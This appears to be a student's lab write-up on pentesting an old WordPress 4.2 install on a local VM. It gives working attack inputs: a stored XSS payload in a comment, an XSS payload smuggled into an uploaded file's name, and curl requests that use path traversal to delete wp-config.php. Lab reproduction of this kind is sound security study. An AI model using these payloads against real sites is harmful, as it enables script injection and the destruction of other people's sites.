# Project 7 - WordPress Pentesting

Time spent: **4** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. Unauthenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: Cross-Site Scripting
    - Tested in version: 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: ![Stored XSS](./GIFS/lab7gif1.gif) 
  - [ ] Steps to recreate: An attacker can inject Javascript into Wordpress comments, which is then triggered when the script is viewed. So first, I logged into the admin account, and published a new page that could recieve comments where the attack could occur. Then I wrote the following in a comment: "<svg/onload=alert('XSS')/>", and published the comment. Whenever the page was reloaded the alert would appear, therefore proving the attack was successful.
  - [ ] Affected source code: source code couldn't be found

2. Large File Upload Error XSS
  - [ ] Summary: 
    - Vulnerability types: Cross-Site Scripting
    - Tested in version: 4.2
    - Fixed in version: 4.2.15
  - [ ] GIF Walkthrough: ![Large File](./GIFS/lab7gif2.gif)
  - [ ] Steps to recreate: I first googled images that were larger than 20MB, and downloaded an image to my Desktop that I could upload into wordpress. I renamed the file "world.topo.200407.3x21600x21600.C1<img src=x onerror=alert('XSS')>.jpg" so that when the image was uploaded, the file name would display the alert. I created a new media file in Wordpress and when I went to upload the file, the XSS alert popped up proving the attack was successful.

3. Authenticated Arbitrary File Deletion
  - [ ] Summary: 
    - Vulnerability types:  
    - Tested in version: 4.2
    - Fixed in version: 4.2.21
  - [ ] GIF Walkthrough: ![File Deletion](./GIFS/lab2gif3.gif)
  - [ ] Steps to recreate: To recreate this attack, I logged in as admin and uploaded an image in a new media post. I then went to edit the image, and inspected the element of the page to find the _wponce value and the Cookie. I used these two commands with the found Cookie, _wponce value and URL: (found from the instructions on blog.vulnsy.com) "curl -v 'http://wpdistillery.vm/wp-admin/post.php?post=11' -H 'Cookie: wordpress_4eeeccf202d6f9157cf690a61cb703b4=admin%7C1540089574%7C8lj3zp4K49vKk2Zj5RRHtCAeksyCj3qRea5tWpy9eS3%7C996cedaa90cafc88dd8512e6d87229bfe26455363e2b720f247575db618531f9; wp-settings-time-1=1539830916; wp-settings-1=libraryContent%3Dbrowse; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_4eeeccf202d6f9157cf690a61cb703b4=admin%7C1540089574%7C8lj3zp4K49vKk2Zj5RRHtCAeksyCj3qRea5tWpy9eS3%7Cbc173c4f49746de0955b56de4b72f3ae457e102cfb5f939e21c0bcbeac597160' -d 'action=editattachment&_wpnonce=d7dfddaecb&thumb=../../../../wp-config.php'" and "curl -v 'http://wpdistillery.vm/wp-admin/post.php?post=11' -H 'Cookie: wordpress_4eeeccf202d6f9157cf690a61cb703b4=admin%7C1540089574%7C8lj3zp4K49vKk2Zj5RRHtCAeksyCj3qRea5tWpy9eS3%7C996cedaa90cafc88dd8512e6d87229bfe26455363e2b720f247575db618531f9; wp-settings-time-1=1539830916; wp-settings-1=libraryContent%3Dbrowse; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_4eeeccf202d6f9157cf690a61cb703b4=admin%7C1540089574%7C8lj3zp4K49vKk2Zj5RRHtCAeksyCj3qRea5tWpy9eS3%7Cbc173c4f49746de0955b56de4b72f3ae457e102cfb5f939e21c0bcbeac597160' -d 'action=delete&_wpnonce=d7dfddaecb'". Once these two commands were run in terminal, I went back to my image and deleted the image permanently. I was then redirected to a page that essentially broke the site and allowed no further actions to be performed. An attacker could easily start deleting files, accessing information, reconfiguring the site and more.
